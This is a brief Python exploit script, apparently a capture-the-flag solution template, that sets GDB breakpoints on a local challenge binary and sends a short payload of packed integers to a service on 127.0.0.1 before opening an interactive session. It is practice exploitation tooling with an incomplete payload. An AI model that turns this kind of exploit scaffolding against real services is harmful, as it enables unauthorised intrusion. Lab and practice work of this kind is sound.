#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 13334)

gdbscript = '''
tbreak main
b *main+359
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

payload = p(3039) + p(0x1)# + p32(0xdeadbeef) + p64(0x12345678)
print(len(payload))
re()
sl(payload)

io.interactive()
